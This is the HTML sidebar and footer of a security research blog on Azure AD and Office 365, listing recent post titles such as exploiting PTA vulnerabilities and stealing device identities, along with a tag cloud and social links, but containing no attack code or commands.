	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
		<label>
			<span class="screen-reader-text">Search for:</span>
			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
		</label>
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
	</form>
</div>
	
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
		</ul>
	</div>
</div>

	
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
		</ul>
	</div>
</div>
	
<div class="widget-social widget">
	<h4 class="widget-social__title widget__title">Social</h4>
	<div class="widget-social__content widget__content">
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
				<span>Twitter</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
				<span>LinkedIn</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
				<span>nestori.syynimaa@gerenios.com</span>
			</a>
		</div>
	</div>
</div>

	
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
	</div>
</div>
</aside>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
